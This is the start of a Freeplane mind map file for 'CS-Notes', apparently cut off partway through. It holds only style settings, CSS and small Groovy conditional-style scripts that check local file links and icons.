<map version="freeplane 1.12.1">
<!--To view this file, download free mind mapping software Freeplane from https://www.freeplane.org -->
<attribute_registry SHOW_ATTRIBUTES="selected"/>
<bookmarks>
    <bookmark nodeId="ID_20240928140957816" name="Root" opensAsRoot="true"/>
</bookmarks>
<node FOLDED="false" ID="ID_20240928140957816" CREATED="1609150826839" MODIFIED="1754790164359" LINK="https://github.com/CyC2018/CS-Notes"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    CS-Notes
  </body>
</html>
</richcontent>
<hook NAME="accessories/plugins/AutomaticLayout.properties" VALUE="ALL"/>
<attribute_layout NAME_WIDTH="100 pt" VALUE_WIDTH="100 pt"/>
<edge COLOR="#cccccc"/>
<hook NAME="MapStyle" background="#ffffffff" zoom="1.03">
    <conditional_styles>
        <conditional_style ACTIVE="false" STYLE_REF="content" LAST="false">
            <script_condition>
                <script>// Is File Link: 

node.link.text &amp;&amp; node.link.text.matches(&quot;.*\\.\\w+&quot;)</script>
            </script_condition>
        </conditional_style>
        <conditional_style ACTIVE="false" STYLE_REF="exception" LAST="false">
            <script_condition>
                <script>// File Not Found: 
def link = node.link.text

if(link &amp;&amp; !link.contains(&quot;:&quot;) &amp;&amp; !link.endsWith(&quot;/&quot;)) {
    return !new File(node.mindMap.file.parent, URLDecoder.decode(link, &quot;utf-8&quot;)).exists()
}

return false</script>
            </script_condition>
        </conditional_style>
        <conditional_style ACTIVE="false" STYLE_REF="highlight" LAST="false">
            <script_condition>
                <script>// Link Path Exists: 

if(!node.link.text || !c.selecteds.contains(node)) return false

def link = node.link.text
if(link.matches(&quot;(https*|file|\\w):.*&quot;)) return false
def path = node.pathToRoot
    .findAll { it != node.mindMap.root }
    .collect { it.plainText }
    .join(&quot;/&quot;)
def file = new File(node.mindMap.file.parent, path)
if(!file.exists() &amp;&amp; !link.endsWith(&quot;/&quot;)) file = new File(node.mindMap.file.parent, path + &quot;.mm&quot;)
return file.exists()</script>
            </script_condition>
        </conditional_style>
        <conditional_style ACTIVE="false" STYLE_REF="highlight" LAST="false">
            <script_condition>
                <script>// highlight  
return node.icons.contains(&quot;highlight&quot;)
</script>
            </script_condition>
        </conditional_style>
        <conditional_style ACTIVE="false" STYLE_REF="bg-gray" LAST="false">
            <script_condition>
                <script>// ? 
if(!node.icons) return false
def count = 1
if(node.icons.findAll{it == &quot;bookmark&quot;}.size() == count) return true
else return false</script>
            </script_condition>
        </conditional_style>
        <conditional_style ACTIVE="false" STYLE_REF="bg-blue" LAST="false">
            <script_condition>
                <script>// ?? 
if(!node.icons) return false
def count = 2
if(node.icons.findAll{it == &quot;bookmark&quot;}.size() == count) return true
else return false</script>
            </script_condition>
        </conditional_style>
        <conditional_style ACTIVE="false" STYLE_REF="bg-orange" LAST="false">
            <script_condition>
                <script>// ??? 
if(!node.icons) return false
def count = 3
if(node.icons.findAll{it == &quot;bookmark&quot;}.size() == count) return true
else return false</script>
            </script_condition>
        </conditional_style>
        <conditional_style ACTIVE="false" STYLE_REF="0%" LAST="false">
            <disjunct_condition>
                <icon_contained_condition ICON="0%"/>
                <icon_contained_condition ICON="12.5%"/>
            </disjunct_condition>
        </conditional_style>
        <conditional_style ACTIVE="false" STYLE_REF="25%" LAST="false">
            <disjunct_condition>
                <icon_contained_condition ICON="25%"/>
                <icon_contained_condition ICON="37.5%"/>
            </disjunct_condition>
        </conditional_style>
        <conditional_style ACTIVE="false" STYLE_REF="50%" LAST="false">
            <disjunct_condition>
                <icon_contained_condition ICON="50%"/>
                <icon_contained_condition ICON="62.5%"/>
            </disjunct_condition>
        </conditional_style>
        <conditional_style ACTIVE="false" STYLE_REF="75%" LAST="false">
            <disjunct_condition>
                <icon_contained_condition ICON="75%"/>
                <icon_contained_condition ICON="87.5%"/>
            </disjunct_condition>
        </conditional_style>
        <conditional_style ACTIVE="false" STYLE_REF="100%" LAST="false">
            <disjunct_condition>
                <icon_contained_condition ICON="100%"/>
                <icon_contained_condition ICON="checked"/>
            </disjunct_condition>
        </conditional_style>
        <conditional_style ACTIVE="false" STYLE_REF="hide" LAST="false">
            <disjunct_condition>
                <icon_contained_condition ICON="closed"/>
                <icon_contained_condition ICON="stop-sign"/>
            </disjunct_condition>
        </conditional_style>
        <conditional_style ACTIVE="false" STYLE_REF="doubt" LAST="false">
            <disjunct_condition>
                <icon_contained_condition ICON="messagebox_warning"/>
                <icon_contained_condition ICON="help"/>
            </disjunct_condition>
        </conditional_style>
        <conditional_style ACTIVE="false" STYLE_REF="wrong" LAST="false">
            <icon_contained_condition ICON="button_cancel"/>
        </conditional_style>
        <conditional_style ACTIVE="false" STYLE_REF="green" LAST="false">
            <icon_contained_condition ICON="button_ok"/>
        </conditional_style>
        <conditional_style ACTIVE="false" STYLE_REF="notice" LAST="false">
            <icon_contained_condition ICON="yes"/>
        </conditional_style>
        <conditional_style ACTIVE="false" STYLE_REF="mark" LAST="false">
            <icon_contained_condition ICON="info"/>
        </conditional_style>
        <conditional_style ACTIVE="false" LOCALIZED_STYLE_REF="default" LAST="false">
            <script_condition>
                <script>// code | content  
if(!node.parent) return false
if(node.style.name == &quot;default&quot; || !node.style.name) {
    def regex = &quot;(code|content|comment)&quot;
    def styleName = node.parent.style.name
    if(styleName &amp;&amp; styleName.matches(regex)) {
        node.style.name = styleName
    }
}
if(node.plainText.startsWith(&quot;::&quot;)) {
    try {
        
        def styleName = node.plainText.substring(2)
        if(styleName.contains(&quot;:&quot;)) {
            node.text = styleName.substring(styleName.indexOf(&quot;:&quot;)+1)
            styleName = styleName.substring(0, styleName.indexOf(&quot;:&quot;))
        } else {
            node.text = &quot;&quot;
        }
        node.style.name = styleName
        
    } catch(Exception e) {
        node.text = &quot;&lt;html&gt;&lt;div&gt;&lt;b class=&apos;code-exception&apos;&gt;Exception: &lt;/b&gt;&quot; + node.plainText + &quot;&lt;/div&gt;&lt;/html&gt;&quot;
    }
}
return false</script>
            </script_condition>
        </conditional_style>
        <conditional_style ACTIVE="false" STYLE_REF="script" LAST="false">
            <disjunct_condition>
                <node_compare_condition VALUE="test" COMPARATION_RESULT="0" SUCCEED="true" ITEM="filter_node"/>
                <hyper_link_contains TEXT="RunNoteScript"/>
            </disjunct_condition>
        </conditional_style>
        <conditional_style ACTIVE="false" LOCALIZED_STYLE_REF="defaultstyle.floating" LAST="false">
            <script_condition>
                <script>//�����ڵ�

if(node.children.size()==0) return false
def stream = new ArrayList(node.children).stream()
if(stream.anyMatch(x -&gt; x.isFree())) return true

return false</script>
            </script_condition>
        </conditional_style>
        <conditional_style ACTIVE="false" STYLE_REF="doubt" LAST="false">
            <script_condition>
                <script>//map file not found:  

def link = node.link.text
if(!c.selecteds.contains(node) || !link || !link.endsWith(&quot;.mm&quot;)) return false

def index = link.lastIndexOf(&quot;/&quot;)
if(index == -1) return false
def fileName = link.contains(&quot;/&quot;) ? link.substring(index+1) : link
def pathToRootText = node.pathToRoot
        .findAll { it != node.mindMap.root &amp;&amp; it != node }
        .collect { it.plainText }
        .join(&quot;/&quot;)

def file = new File(node.mindMap.file.parent, pathToRootText + &quot;/&quot; + fileName)

return !file.exists()</script>
            </script_condition>
        </conditional_style>
    </conditional_styles>
    <properties show_icon_for_attributes="true" edgeColorConfiguration="" spatiallySeparateSubtrees="true" show_tags="UNDER_NODES" show_note_icons="true" associatedTemplateLocation="template:/_light.mm" fit_to_viewport="false" show_icons="BESIDE_NODES" showTagCategories="false"/>
    <tags category_separator="::" tagcolor1="geekmap#04ed00ff"/>

<map_styles>
<stylenode LOCALIZED_TEXT="styles.root_node" STYLE="oval" UNIFORM_SHAPE="true" FORMAT="STANDARD_FORMAT" VGAP_QUANTITY="24 pt" BORDER_WIDTH="1 px">
<font SIZE="24"/>
<edge STYLE="horizontal" COLOR="#cccccc" WIDTH="2"/>
<stylenode LOCALIZED_TEXT="styles.predefined" POSITION="bottom_or_right" STYLE="bubble" FORMAT="STANDARD_FORMAT" BORDER_WIDTH="1 px">
<edge STYLE="horizontal" COLOR="#cccccc" WIDTH="2"/>
<stylenode LOCALIZED_TEXT="default" ID="ID_1895114196" ICON_SIZE="15 pt" FORMAT_AS_HYPERLINK="false" COLOR="#333333" STYLE="bubble" SHAPE_HORIZONTAL_MARGIN="5 pt" SHAPE_VERTICAL_MARGIN="3 pt" NUMBERED="false" FORMAT="STANDARD_FORMAT" TEXT_ALIGN="DEFAULT" TEXT_WRITING_DIRECTION="LEFT_TO_RIGHT" MAX_WIDTH="800 px" MIN_WIDTH="50 px" BORDER_WIDTH_LIKE_EDGE="false" BORDER_WIDTH="1 px" BORDER_COLOR_LIKE_EDGE="false" BORDER_COLOR="#cccccc" BORDER_DASH_LIKE_EDGE="false" BORDER_DASH="SOLID" VGAP_QUANTITY="2 pt" COMMON_HGAP_QUANTITY="20 pt" CHILD_NODES_LAYOUT="AUTO_CENTERED">
<arrowlink SHAPE="CUBIC_CURVE" COLOR="#cccccc" WIDTH="2" TRANSPARENCY="255" DASH="" FONT_SIZE="8" DESTINATION="ID_1895114196" STARTARROW="NONE" ENDARROW="DEFAULT"/>
<font NAME="Microsoft YaHei" SIZE="12" BOLD="false" STRIKETHROUGH="false" ITALIC="false"/>
<edge STYLE="horizontal" COLOR="#cccccc" WIDTH="1" DASH="SOLID"/>
<richcontent TYPE="DETAILS" CONTENT-TYPE="plain/html"/>
<richcontent TYPE="NOTE" CONTENT-TYPE="plain/html"/>
<hook NAME="NodeCss">
h1 {
  color:#B5A0C9; /*#B5A0C9;*/
  font-size: 12pt;
}
h2 {
  color:#400080; /*#400080,#B5A0C9;*/
  font-size: 10pt;
  border-bottom: 2px solid #E1EBF5;
}
h3 {
  color:#5D17A3; /*#5D17A3,#B5A0C9;*/
  font-size: 9pt;
  padding-left: 5px;
}

h4 {
  color:#8148BA; /*#8148BA,#877EB8;*/
  font-size: 8pt;
  padding-left: 5px;
}

h5 {
  color: #B591D9; /*#B591D9,#8160A1;*/
  font-size: 7pt;
  padding-left: 5px;
}
h6 {
  color: #D5C5E6; /*#D5C5E6,#FFFFFF;*/
  font-size: 6pt;
  padding-left: 5px;
}

.title5 {
  color: #8698F2;
  background-color:#DBE4EB;
  text-decoration: overline;
  font-weight: normal;
}

.title6 {
  color: black,#D5C5E6;
  background-color:#DBE4EB;
  font-weight: normal;
  text-decoration: overline;
}

pre {
  /* font-size: 10pt; */
  margin-left: 10px;
  margin-right: 10px;
  padding: 3px;
  /* background-color:#DBE4EB;  */
  background-color:#F3F2F2; 
  font-family: consolas, Microsoft YaHei, serif;

}
pre.input {
  border-left-color: #89A8D6; 
  /* border-left: 2px solid #89A8D6; */
}
pre.output {
  color: #787AB2;
  border-left: 2px solid #787AB2;
}
/* code.details {
  font-size: 10pt;
} */
code, kbd {
  font-size: 10pt;
  background-color:#F3F2F2;
  /* background-color:#DBE4EB; */
  font-family: consolas, serif;
}

blockquote {
  margin-top: 1px;
  margin-bottom: 1px;
  margin-left: 10px;
  margin-right: 10px;
  color: #769496;
  padding: 5px;
  border-top: 0px solid #769496;
  border-bottom: 0px solid #769496;
  border-left: 1px solid #769496;
  border-right: 0px solid #769496;
}

/* table {
  width: 100%;
  margin: 1px;
}

th {
  background-color:#DBE4EB;
}

th, td {
  text-align: left; 
  border-top: 0px solid white;
  border-bottom: 1px solid #CCCCCC;
  border-left: 0px solid white;
  border-right: 0px solid white;
}
tr {
  text-align: left; 
} */

table {
  width: 100%;
}

th {
  max-width: 20%;
  white-space: nowrap;
  overflow: hidden;
  text-overflow: ellipsis;
  font-weight: bold;
}

tr {
  text-align: left; 
}

th, td {
  border: 1px solid #f3f2f2;

}



ol, ul, dl {
  margin-left: 10px;
  margin-top: 1px;
  margin-bottom: 1px;
}

ul.outline, ul.outline ul {
  list-style-type: none; /* 移除列表项目符号 */
  margin-left: 5px; /* 列表的整体左边距 */
  padding-left: 0; /* 移除列表的内边距 */
}

ul.outline li {
  border-left: 1px solid #d1d1d1; /* 左侧显示竖线 */
  padding-left: 5px; /* 列表项内容与竖线之间的空间 */
}


a {
  color: #829CF8;
}

u {
  background-color:#f3f2f2;
}


abbr {
  color: gray;
  text-decoration: dotted;
}

img {
  width: 100%;
}

details {
  border: 1px solid #24272E;
}

/* p {
  padding-top: 3pt;
  padding-bottom: 3pt;
} */

.toc {
   border-top: 2px solid #DBE4EB;
}

span[data-type=&apos;emoji&apos;] {
  font-family: sans-serif;
}

.info, .info-details {
  background-color:#DBE4EB;
  border-top: 1px solid #C9C9E0;
  border-bottom: 1px solid #C9C9E0;
  border-left: 0px solid #C9C9E0;
  border-right: 0px solid #C9C9E0;
}
.warn, .warn-details {
  background-color:#DBE4EB;
  color: #F54D4D;
  border-top: 1px solid #F54D4D;
  border-bottom: 1px solid #F54D4D;
  border-left: 0px solid #F54D4D;
  border-right: 0px solid #F54D4D;
}
.check, .check-details {
  background-color:#DBE4EB;
  color: green;
  border-top: 1px solid green;
  border-bottom: 1px solid green;
  border-left: 0px solid green;
  border-right: 0px solid green;
}
.refer, .refer-details {
  /* font-family: 迷你简启体; */
  /* font-size: 11pt; */
  font-style: italic;
  background-color:#DBE4EB;
  border-top: 1px solid #C9C9E0;
  border-bottom: 1px solid #C9C9E0;
  border-left: 0px solid #C9C9E0;
  border-right: 0px solid #C9C9E0;
}
.details {
  border: 1px dashed #DBE4EB;
}
.default-details, .info-details, .warn-details, .check-details, .refer-details {
  text-decoration: none;
  border-style: dashed;
}

.keyword {
  font-family: Microsoft YaHei, 微软雅黑, serif;
  font-weight: bold;
}


blockquote.comment {
  position: relative;
  padding-left: 2em;
  font-style: italic;
  color: gray;
  border-left: 5px;
}
blockquote.comment p {
  font-family: kaiti, Microsoft YaHei, 微软雅黑, Noto Sans CJK SC, &quot;PingFang SC&quot;, sans-serif !important;
  border-bottom: 1px solid #DBE4EB;
}

.code-public {
  color: #0D9A37;
  font-family: consolas;
}
/* .code-public {
  color: #F4EA2A;
} */
.code-private {
  color: red;
  font-family: consolas;
}
.code-static {
  font-style: italic;
  text-decoration: underline;
  /* background-color: gray; */
  font-family: consolas;
}

.code-method {
  color: #72A9FF;
  font-weight: bold;
  font-family: consolas;
}
.code-field {
  color: #E66D64;
  font-weight: bold;
  font-family: consolas;
}
.code-class {
  color: #A2BA1B;
  font-weight: bold;
  font-family: consolas;
}

.code-enum {
  color: #D1D67D;
  font-weight: bold;
  font-family: consolas;
}

.code-constructor {
  color: #4C6CF5;
  font-weight: bold;
  font-family: consolas;
}
.code-interface {
  color: #AB4986;
  font-family: consolas;
}
.code-annotation {
  color: #AB4986;
  font-weight: bold;
  font-family: consolas;
}
.code-exception {
  color: #CC3142;
  font-family: consolas;
}
.code-param {
  font-weight: normal;
  font-family: consolas;
}
.code-string {
  color: #965D23;
  font-family: consolas;
}
.code-comment {
  color: gray;
  font-family: consolas;
}


.color-blue {
  color: #72A9FF;
}
.color-orange {
  color: #FFA952;
}
.color-yellow {
  color: #A2BA1B,yellow;
}
.color-green {
  color: #3DCC7D;
}
.color-purple {
  color: #4C6CF5;
}
.color-gray {
  color:#a79c9c;
  font-weight: normal;
}
.color-red {
  color: #CC3142;
  font-weight: normal;
}

.point-red, .background-color-red {
  color: black,white;
  background-color: #CC3142;
}
.point-blue, .background-color-blue {
  color: black;
  background-color: #C9D5FF;
}
.point-orange, .background-color-orange {
  color: black;
  background-color: #FFA952;
  
}
.point-yellow, .background-color-yellow, .highlight {
  color: black;
  background-color: yellow;
}
.point-green, .background-color-green {
  color: black;
  color: #3DCC7D;
}
.point-gray, .background-color-gray {
  color: black,white;
  background-color:#CCCCCC;
  font-weight: normal;
  
}

.ai-explaination {
  border-left: dotted; 
  color: gray; 
  padding-left: 10px;
}
.translation {
  /* font-size: 8pt; */
  padding: 2px;
  margin-left: 5px;
  margin-right: 5px;
  color: gray;
  border: 1px dotted;
}

small, .inlinecomment {
  color: #ADADAD, gray;
  font-size: 9pt;
}


div.ai-chatgpt {
  border: 1px dotted;
  border-color: orange;
  margin: 2pt;
  padding: 2pt;
}

a.quicker-nav {
  color: gray;
}

.reference {
  font-style: italic;
}

div.tag, div.details, div.note {
  border-top: 1px solid gray; 
  margin: 0px 0;
}
.tag {
  border: 1px solid gray; 
  background-color: #E4E4E4, gray;
}



</hook>
</stylenode>
<stylenode LOCALIZED_TEXT="defaultstyle.details" ID="ID_1027068381" ICON_SIZE="15 pt" COLOR="#999999" BACKGROUND_COLOR="#fdfdfc" BACKGROUND_ALPHA="0" STYLE="bubble" SHAPE_HORIZONTAL_MARGIN="5 pt" SHAPE_VERTICAL_MARGIN="3 pt" NUMBERED="false" FORMAT="STANDARD_FORMAT" MAX_WIDTH="20 cm" BORDER_WIDTH="1 px" BORDER_COLOR="#fdfdfc" BORDER_COLOR_ALPHA="0">
<font NAME="Microsoft YaHei" SIZE="8" BOLD="false"/>
<edge STYLE="horizontal" COLOR="#cccccc" WIDTH="1"/>
</stylenode>
<stylenode LOCALIZED_TEXT="defaultstyle.tags">
<font SIZE="10"/>
<edge WIDTH="1"/>
</stylenode>
<stylenode LOCALIZED_TEXT="defaultstyle.attributes" ID="ID_1176025365" ICON_SIZE="15 pt" COLOR="#999999" STYLE="bubble" SHAPE_HORIZONTAL_MARGIN="5 pt" SHAPE_VERTICAL_MARGIN="3 pt" NUMBERED="false" FORMAT="STANDARD_FORMAT" MAX_WIDTH="20 cm" BORDER_WIDTH="1 px" BORDER_COLOR="#fdfdfc" BORDER_COLOR_ALPHA="0">
<font NAME="Microsoft YaHei" SIZE="8" BOLD="false"/>
<edge STYLE="horizontal" COLOR="#cccccc" WIDTH="2"/>
</stylenode>
<stylenode LOCALIZED_TEXT="defaultstyle.note" ID="ID_1045000209" ICON_SIZE="15 pt" COLOR="#333333" BACKGROUND_COLOR="#ffffff" STYLE="bubble" SHAPE_HORIZONTAL_MARGIN="5 pt" SHAPE_VERTICAL_MARGIN="3 pt" NUMBERED="false" FORMAT="STANDARD_FORMAT" MAX_WIDTH="20 cm" BORDER_WIDTH="1 px" BORDER_COLOR="#fdfdfc" BORDER_COLOR_ALPHA="0">
<font NAME="Microsoft YaHei" SIZE="11" BOLD="false"/>
<edge STYLE="horizontal" COLOR="#cccccc" WIDTH="1"/>
</stylenode>
<stylenode LOCALIZED_TEXT="defaultstyle.floating" ICON_SIZE="15 pt" COLOR="#333333" BACKGROUND_COLOR="#f2f2f2" STYLE="bubble" SHAPE_HORIZONTAL_MARGIN="5 pt" SHAPE_VERTICAL_MARGIN="3 pt" NUMBERED="false" FORMAT="STANDARD_FORMAT" MAX_WIDTH="15 cm" BORDER_WIDTH="1 px" BORDER_COLOR="#fdfdfc" BORDER_COLOR_ALPHA="0">
<font NAME="Microsoft YaHei" SIZE="12" BOLD="false"/>
<edge STYLE="hide_edge" COLOR="#cccccc" WIDTH="1" DASH="SOLID"/>
</stylenode>
<stylenode LOCALIZED_TEXT="defaultstyle.selection" ICON_SIZE="15 pt" COLOR="#333333" BACKGROUND_COLOR="#6699ff" FORMAT="STANDARD_FORMAT" BORDER_WIDTH="1 px" BORDER_COLOR_LIKE_EDGE="false" BORDER_COLOR="#fdfdfc" BORDER_COLOR_ALPHA="0">
<font SIZE="12"/>
<edge STYLE="horizontal" COLOR="#cccccc" WIDTH="1"/>
</stylenode>
</stylenode>
<stylenode LOCALIZED_TEXT="styles.user-defined" POSITION="bottom_or_right" STYLE="bubble" FORMAT="STANDARD_FORMAT" BORDER_WIDTH="1 px">
<edge STYLE="horizontal" COLOR="#cccccc" WIDTH="2"/>
<stylenode TEXT="doubt" ICON_SIZE="15 pt" FORMAT_AS_HYPERLINK="false" COLOR="#ff3300" STYLE="bubble" SHAPE_HORIZONTAL_MARGIN="5 pt" SHAPE_VERTICAL_MARGIN="3 pt" NUMBERED="false" FORMAT="STANDARD_FORMAT" MAX_WIDTH="1200 px" BORDER_WIDTH_LIKE_EDGE="false" BORDER_WIDTH="1 px" BORDER_COLOR="#dbdbdb" BORDER_DASH_LIKE_EDGE="false">
<font NAME="Microsoft YaHei" SIZE="12" BOLD="false"/>
<edge STYLE="horizontal" WIDTH="1"/>
</stylenode>
<stylenode TEXT="mark" ICON_SIZE="15 pt" FORMAT_AS_HYPERLINK="false" COLOR="#ffcc99" STYLE="bubble" SHAPE_HORIZONTAL_MARGIN="5 pt" SHAPE_VERTICAL_MARGIN="3 pt" NUMBERED="false" FORMAT="STANDARD_FORMAT" MAX_WIDTH="1200 px" BORDER_WIDTH_LIKE_EDGE="false" BORDER_WIDTH="1 px" BORDER_COLOR="#dbdbdb" BORDER_DASH_LIKE_EDGE="false">
<font NAME="Microsoft YaHei" SIZE="12" BOLD="false"/>
<edge STYLE="horizontal" WIDTH="1"/>
</stylenode>
<stylenode TEXT="wrong" ICON_SIZE="15 pt" FORMAT_AS_HYPERLINK="false" COLOR="#cccccc" STYLE="bubble" SHAPE_HORIZONTAL_MARGIN="5 pt" SHAPE_VERTICAL_MARGIN="3 pt" NUMBERED="false" FORMAT="STANDARD_FORMAT" MAX_WIDTH="1200 px" BORDER_WIDTH_LIKE_EDGE="false" BORDER_WIDTH="1 px" BORDER_COLOR="#dbdbdb" BORDER_DASH_LIKE_EDGE="false" BORDER_DASH="SOLID">
<font NAME="Microsoft YaHei" SIZE="12" BOLD="false" STRIKETHROUGH="true"/>
<edge STYLE="horizontal" WIDTH="1"/>
</stylenode>
<stylenode TEXT="highlight" FORMAT_AS_HYPERLINK="false" COLOR="#333333" STYLE="bubble" SHAPE_HORIZONTAL_MARGIN="5 pt" SHAPE_VERTICAL_MARGIN="3 pt" NUMBERED="false" FORMAT="STANDARD_FORMAT" MAX_WIDTH="1200 px" BORDER_WIDTH_LIKE_EDGE="false" BORDER_WIDTH="2 px" BORDER_COLOR="#ffff00" BORDER_DASH_LIKE_EDGE="false">
<font NAME="Microsoft YaHei"/>
<edge STYLE="horizontal" WIDTH="1"/>
</stylenode>
<stylenode TEXT="hide" ICON_SIZE="15 pt" FORMAT_AS_HYPERLINK="false" COLOR="#ebebeb" STYLE="bubble" SHAPE_HORIZONTAL_MARGIN="5 pt" SHAPE_VERTICAL_MARGIN="3 pt" NUMBERED="false" FORMAT="STANDARD_FORMAT" MAX_WIDTH="1200 px" BORDER_WIDTH_LIKE_EDGE="false" BORDER_WIDTH="1 px" BORDER_COLOR="#dbdbdb" BORDER_DASH_LIKE_EDGE="false" BORDER_DASH="CLOSE_DOTS">
<font NAME="Microsoft YaHei" SIZE="12" BOLD="false"/>
<edge STYLE="horizontal" WIDTH="1"/>
</stylenode>
<stylenode TEXT="notice" ICON_SIZE="15 pt" FORMAT_AS_HYPERLINK="false" COLOR="#ff9933" STYLE="bubble" SHAPE_HORIZONTAL_MARGIN="5 pt" SHAPE_VERTICAL_MARGIN="3 pt" NUMBERED="false" FORMAT="STANDARD_FORMAT" MAX_WIDTH="1200 px" BORDER_WIDTH_LIKE_EDGE="false" BORDER_WIDTH="1 px" BORDER_COLOR="#dbdbdb" BORDER_DASH_LIKE_EDGE="false">
<font NAME="Microsoft YaHei" SIZE="12" BOLD="false"/>
<edge STYLE="horizontal" WIDTH="1"/>
</stylenode>
<stylenode TEXT="script" ICON_SIZE="15 pt" STYLE="rectangle" SHAPE_HORIZONTAL_MARGIN="5 pt" SHAPE_VERTICAL_MARGIN="3 pt" NUMBERED="false" FORMAT="STANDARD_FORMAT" MAX_WIDTH="1200 px" BORDER_WIDTH="1 px" BORDER_COLOR_LIKE_EDGE="false" BORDER_COLOR="#00cc33" BORDER_DASH="SOLID">
<font NAME="΢���ź�" SIZE="12" BOLD="false"/>
<edge STYLE="horizontal" WIDTH="1"/>
</stylenode>
<stylenode TEXT="0%" ICON_SIZE="15 pt" COLOR="#cccccc" BACKGROUND_COLOR="#f2f2f2" STYLE="rectangle" SHAPE_HORIZONTAL_MARGIN="5 pt" SHAPE_VERTICAL_MARGIN="3 pt" NUMBERED="false" FORMAT="STANDARD_FORMAT" MAX_WIDTH="1200 px" BORDER_WIDTH="1 px" BORDER_COLOR_LIKE_EDGE="false" BORDER_COLOR="#cccccc" BORDER_DASH="CLOSE_DOTS">
<font NAME="Microsoft YaHei" SIZE="12" BOLD="false"/>
<edge STYLE="horizontal" WIDTH="1"/>
</stylenode>
<stylenode TEXT="25%" ICON_SIZE="15 pt" BACKGROUND_COLOR="#f2f2f2" STYLE="rectangle" SHAPE_HORIZONTAL_MARGIN="5 pt" SHAPE_VERTICAL_MARGIN="3 pt" NUMBERED="false" FORMAT="STANDARD_FORMAT" MAX_WIDTH="1200 px" BORDER_WIDTH="1 px" BORDER_COLOR_LIKE_EDGE="false" BORDER_COLOR="#ff99cc" BORDER_DASH="CLOSE_DOTS">
<font NAME="Microsoft YaHei" SIZE="12" BOLD="false"/>
<edge STYLE="horizontal" WIDTH="1"/>
</stylenode>
<stylenode TEXT="50%" ICON_SIZE="15 pt" BACKGROUND_COLOR="#f2f2f2" STYLE="rectangle" SHAPE_HORIZONTAL_MARGIN="5 pt" SHAPE_VERTICAL_MARGIN="3 pt" NUMBERED="false" FORMAT="STANDARD_FORMAT" MAX_WIDTH="1200 px" BORDER_WIDTH="1 px" BORDER_COLOR_LIKE_EDGE="false" BORDER_COLOR="#99ccff" BORDER_DASH="CLOSE_DOTS">
<font NAME="Microsoft YaHei" SIZE="12" BOLD="false"/>
<edge STYLE="horizontal" WIDTH="1"/>
</stylenode>
<stylenode TEXT="75%" ICON_SIZE="15 pt" BACKGROUND_COLOR="#f2f2f2" STYLE="rectangle" SHAPE_HORIZONTAL_MARGIN="5 pt" SHAPE_VERTICAL_MARGIN="3 pt" NUMBERED="false" FORMAT="STANDARD_FORMAT" MAX_WIDTH="1200 px" BORDER_WIDTH="1 px" BORDER_COLOR_LIKE_EDGE="false" BORDER_COLOR="#ffcc33" BORDER_DASH="CLOSE_DOTS">
<font NAME="Microsoft YaHei" SIZE="12" BOLD="false"/>
<edge STYLE="horizontal" WIDTH="1"/>
</stylenode>
<stylenode TEXT="100%" ICON_SIZE="15 pt" COLOR="#cccccc" BACKGROUND_COLOR="#f2f2f2" STYLE="rectangle" SHAPE_HORIZONTAL_MARGIN="5 pt" SHAPE_VERTICAL_MARGIN="3 pt" NUMBERED="false" FORMAT="STANDARD_FORMAT" MAX_WIDTH="1200 px" BORDER_WIDTH="1 px" BORDER_COLOR_LIKE_EDGE="false" BORDER_COLOR="#00cc33" BORDER_DASH="DASHES">
<font NAME="Microsoft YaHei" SIZE="12" BOLD="false" STRIKETHROUGH="false"/>
<edge STYLE="horizontal" WIDTH="1"/>
</stylenode>
<stylenode TEXT="comment" ICON_SIZE="12 pt" FORMAT_AS_HYPERLINK="false" COLOR="#666666" BACKGROUND_COLOR="#ffffff" STYLE="fork" SHAPE_HORIZONTAL_MARGIN="5 pt" SHAPE_VERTICAL_MARGIN="3 pt" NUMBERED="false" FORMAT="STANDARD_FORMAT" MAX_WIDTH="15 cm" BORDER_WIDTH_LIKE_EDGE="false" BORDER_WIDTH="1 px" BORDER_COLOR_LIKE_EDGE="false" BORDER_DASH_LIKE_EDGE="false">
<font NAME="Microsoft YaHei UI" SIZE="10" BOLD="false" ITALIC="true"/>
<edge STYLE="horizontal" WIDTH="1"/>
</stylenode>
<stylenode TEXT="code" ICON_SIZE="14 pt" FORMAT_AS_HYPERLINK="false" BACKGROUND_COLOR="#ffffff" STYLE="fork" SHAPE_HORIZONTAL_MARGIN="5 pt" SHAPE_VERTICAL_MARGIN="3 pt" NUMBERED="false" FORMAT="STANDARD_FORMAT" TEXT_ALIGN="DEFAULT" MAX_WIDTH="1200 px" MIN_WIDTH="50 px" BORDER_WIDTH_LIKE_EDGE="false" BORDER_WIDTH="1 px" BORDER_COLOR_LIKE_EDGE="false" BORDER_DASH_LIKE_EDGE="false" BORDER_DASH="SOLID" VGAP_QUANTITY="2 pt" CHILD_NODES_LAYOUT="AUTO_CENTERED">
<font NAME="Consolas" SIZE="10" BOLD="false" STRIKETHROUGH="false" ITALIC="false"/>
<richcontent TYPE="DETAILS" CONTENT-TYPE="plain/html"/>
<edge STYLE="horizontal" WIDTH="1"/>
<richcontent TYPE="NOTE" CONTENT-TYPE="plain/html"/>
</stylenode>
<stylenode TEXT="exception" ICON_SIZE="15 pt" FORMAT_AS_HYPERLINK="false" COLOR="#ff3300" STYLE="bubble" SHAPE_HORIZONTAL_MARGIN="5 pt" SHAPE_VERTICAL_MARGIN="3 pt" NUMBERED="false" FORMAT="STANDARD_FORMAT" MAX_WIDTH="1200 px" BORDER_WIDTH_LIKE_EDGE="false" BORDER_WIDTH="1 px" BORDER_COLOR="#dbdbdb" BORDER_DASH_LIKE_EDGE="false">
<font NAME="Microsoft YaHei" SIZE="12" BOLD="false"/>
<edge STYLE="horizontal" WIDTH="1"/>
</stylenode>
<stylenode TEXT="reference" ICON_SIZE="14 pt" FORMAT_AS_HYPERLINK="false" VGAP_QUANTITY="2 pt" CHILD_NODES_LAYOUT="AUTO_CENTERED" BACKGROUND_COLOR="#ffffff" STYLE="bubble" SHAPE_HORIZONTAL_MARGIN="5 pt" SHAPE_VERTICAL_MARGIN="3 pt" NUMBERED="false" FORMAT="STANDARD_FORMAT" TEXT_ALIGN="DEFAULT" MAX_WIDTH="1200 px" MIN_WIDTH="50 px" BORDER_WIDTH_LIKE_EDGE="false" BORDER_WIDTH="1 px" BORDER_COLOR_LIKE_EDGE="false" BORDER_DASH_LIKE_EDGE="false" BORDER_DASH="SOLID">
<font SIZE="12" BOLD="false" STRIKETHROUGH="false" ITALIC="true"/>
<richcontent TYPE="DETAILS" CONTENT-TYPE="plain/html"/>
<richcontent TYPE="NOTE" CONTENT-TYPE="plain/html"/>
<edge STYLE="horizontal" WIDTH="1"/>
</stylenode>
